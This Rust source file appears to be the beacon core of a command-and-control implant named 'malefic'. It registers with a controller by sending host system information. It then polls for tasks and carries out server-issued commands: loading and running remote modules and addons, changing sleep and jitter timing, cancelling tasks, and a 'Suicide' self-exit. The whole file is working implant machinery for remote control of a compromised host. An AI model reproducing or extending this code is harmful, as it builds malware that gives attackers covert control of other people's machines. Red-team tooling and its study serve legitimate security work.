use std::str::FromStr;
use async_std::task::sleep;
use std::time::Duration;
use anyhow::anyhow;
use lazy_static::lazy_static;
use malefic_core::common::error::MaleficError;
use malefic_core::manager::manager::MaleficManager;
use malefic_core::manager::internal::InternalModule;
use malefic_core::scheduler::TaskOperator;
use malefic_helper::debug;
use malefic_proto::proto::modulepb;
use malefic_proto::{new_error_spite, new_spite};
use malefic_proto::proto::implantpb;
use malefic_proto::proto::implantpb::spite::Body;
use malefic_proto::proto::implantpb::{Spite, Spites};
use malefic_core::{check_body, config};
use malefic_core::transport::{Client, SafeTransport};
use malefic_proto::parser::{marshal};
use crate::meta::MetaConfig;
use crate::malefic::MaleficChannel;

lazy_static!(
    pub static ref EMPTY_SPITES: Spites = Spites { spites: vec![Spite::default()] };
);

pub struct MaleficStub {
    pub(crate) manager: MaleficManager,
    pub(crate) meta: MetaConfig,
    pub(crate) channel: MaleficChannel,
}

impl MaleficStub {
    pub fn new(instance_id: [u8; 4], channel: MaleficChannel) -> Self {
        let mut manager = MaleficManager::new();
        if let Ok(_) = manager.refresh_module() {
            MaleficStub {
                manager,
                meta: MetaConfig::new(instance_id),
                channel,
            }
        } else {
            panic!("origin modules refresh failed");
        }
    }
    
    pub fn register_spite(&mut self) -> Spite {
        let sysinfo = malefic_core::common::sys::get_register_info();

        new_spite(
            0,
            "register".to_string(),
            Body::Register(modulepb::Register {
                name: config::NAME.to_string(),
                proxy: config::PROXY.to_string(),
                module: self.manager.list_module(InternalModule::all()),
                addons: self.manager.list_addon(),
                sysinfo,
                timer: Some(modulepb::Timer {
                    interval: config::INTERVAL.clone(),
                    jitter: config::JITTER.clone() as f64,
                }),
            }),
        )
    }

    async fn push(&mut self, spite: Spite) -> anyhow::Result<()> {
        self.channel.data_sender.send(spite).await?;
        Ok(())
    }
    
    pub async fn process_data(
        &mut self,
        transport: SafeTransport,
        client: &mut Client,
    ) -> Result<(), anyhow::Error> {
        let _ = self.channel.request_sender.send(true).await?;
        

        let spites = if let Ok(data) = self.channel.response_receiver.recv().await {
            data
        } else {
            EMPTY_SPITES.clone()
        };
        let marshaled = marshal(self.meta.get_uuid(), spites.clone())?;
        if let Ok(res) = client.handler(transport.clone(), marshaled).await{
            match res{
                Some(spite_data) => {
                    let spites = spite_data.parse()?;
                    self.handler(spites).await?;
                },
                None => {
                    debug!("[beacon] no recv");
                }
            }
        }else{
            debug!("[beacon] send error, recover spites");
            for spite in spites.spites {
                self.push(spite).await?;
            }
        }

        Ok(())
    }

    
    pub async fn handler(&mut self, spites: Spites) -> anyhow::Result<()> {
        for spite in spites.spites {
            #[cfg(debug_assertions)]
            {
                if malefic_proto::get_message_len(&spite) <= 2048 {
                    println!("{:#?}", spite);
                } else {
                    println!("taskid: {} {}", spite.task_id, spite.name);
                }
            }
            match self.handler_spite(spite.clone()).await {
                Ok(_) => {
                    debug!("{}:{} sender succ", spite.task_id, spite.name)
                },
                Err(e) => {
                    debug!("handler encountered an error: {:#?}", e);
                    let error_id = if let Some(malefic_error) =
                        e.downcast_ref::<MaleficError>()
                    {
                        malefic_error.id()
                    } else {
                        999
                    };
                    self.push(new_error_spite(spite.task_id, spite.name, error_id)).await?
                }
            }
        }
        Ok(())
    }

    async fn handler_spite(&mut self, spite: Spite) -> anyhow::Result<()> {
        match InternalModule::from_str(spite.name.as_str()) {
            Ok(InternalModule::Ping) => {
                let ping = check_body!(spite, Body::Ping)?;
                self.push(new_spite(
                    spite.task_id,
                    InternalModule::Ping.to_string(),
                    Body::Ping(modulepb::Ping { nonce: ping.nonce, })
                )).await?
            }
            Ok(InternalModule::Init) => {
                let req = check_body!(spite, Body::Init)?;
                let id: [u8; 4] = req.data
                    .try_into()
                    .map_err(|_| anyhow!("Expected a Vec<u8> of length 4"))?; 

                self.meta.set_id(id);
                let spite = self.register_spite();
                self.push(spite).await?
            }
            Ok(InternalModule::RefreshModule) => {
                self.manager.refresh_module()?;
                self.push(new_spite(
                    spite.task_id,
                    InternalModule::RefreshModule.to_string(),
                    Body::Empty(implantpb::Empty::default()),
                )).await?;
            }
            Ok(InternalModule::ListModule) => {
                let result = new_spite(
                    spite.task_id,
                    InternalModule::ListModule.to_string(),
                    Body::Modules(modulepb::Modules {
                        modules: self.manager.list_module(InternalModule::all()),
                    }),
                );
                self.push(result).await?;
            }
            Ok(InternalModule::LoadModule) => {
                self.manager.load_module(spite.clone())?;
                self.push(new_spite(
                        spite.task_id,
                        InternalModule::LoadModule.to_string(),
                        Body::Empty(implantpb::Empty::default()),
                    )).await?;
            }
            Ok(InternalModule::LoadAddon) => {
                self.manager.load_addon(spite.clone())?;
                self.push(new_spite(
                        spite.task_id,
                        InternalModule::LoadAddon.to_string(),
                        Body::Empty(implantpb::Empty::default()),
                    ))
                    .await?;
            }
            Ok(InternalModule::ListAddon) => {
                let result = new_spite(
                    spite.task_id,
                    InternalModule::ListAddon.to_string(),
                    Body::Addons(modulepb::Addons {
                        addons: self.manager.list_addon(),
                    }),
                );
                self.push(result).await?;
            }
            Ok(InternalModule::ExecuteAddon) => {
                let result = self.manager.execute_addon(spite)?;
                let module = self
                    .manager
                    .get_module(&result.name)
                    .ok_or_else(|| anyhow!(MaleficError::ModuleNotFound))?;
                let body = result.body.ok_or_else(|| anyhow!(MaleficError::MissBody))?;
                self.channel
                    .scheduler_task_sender
                    .send((result.r#async, result.task_id, module.new_instance(), body))
                    .await?;
            }
            Ok(InternalModule::RefreshAddon) => {
                self.manager.refresh_addon()?;
                self.push(new_spite(
                        spite.task_id,
                        InternalModule::RefreshAddon.to_string(),
                        Body::Empty(implantpb::Empty::default()),
                    ))
                    .await?;
            }
            Ok(InternalModule::Clear) => {
                self.manager.clean()?;
                self.push(new_spite(
                        spite.task_id,
                        InternalModule::Clear.to_string(),
                        Body::Empty(implantpb::Empty::default()),
                    ))
                    .await?;
            }
            Ok(InternalModule::CancelTask) => {
                if let Some(Body::Task(task)) = spite.body {
                    self.channel
                        .scheduler_task_ctrl
                        .send(TaskOperator::CancelTask(task.task_id))
                        .await?;
                }
            }
            Ok(InternalModule::QueryTask) => {
                if let Some(Body::Task(task)) = spite.body {
                    self.channel
                        .scheduler_task_ctrl
                        .send(TaskOperator::QueryTask(task.task_id))
                        .await?;
                }
            }
            Ok(InternalModule::Sleep) => {
                let sleep = check_body!(spite, Body::SleepRequest)?;
                self.meta.update(sleep.interval, sleep.jitter);
                self.push(new_spite(
                        spite.task_id,
                        InternalModule::Sleep.to_string(),
                        Body::Empty(implantpb::Empty::default()),
                    ))
                    .await?;
            }
            Ok(InternalModule::Suicide) => {
                self.push(new_spite(
                        spite.task_id,
                        InternalModule::Suicide.to_string(),
                        Body::Empty(implantpb::Empty::default()),
                    ))
                    .await?;
                sleep(Duration::from_secs(self.meta.interval * 2)).await;
                std::process::exit(0);
            }
            Err(_) => {
                let body = spite.body.ok_or_else(|| anyhow!(MaleficError::MissBody))?;
                let module = self
                    .manager
                    .get_module(&spite.name)
                    .ok_or_else(|| anyhow!(MaleficError::ModuleNotFound))?;
                self.channel
                    .scheduler_task_sender
                    .send((spite.r#async, spite.task_id, module.new_instance(), body))
                    .await?;
            }
        };
        Ok(())
    }
}


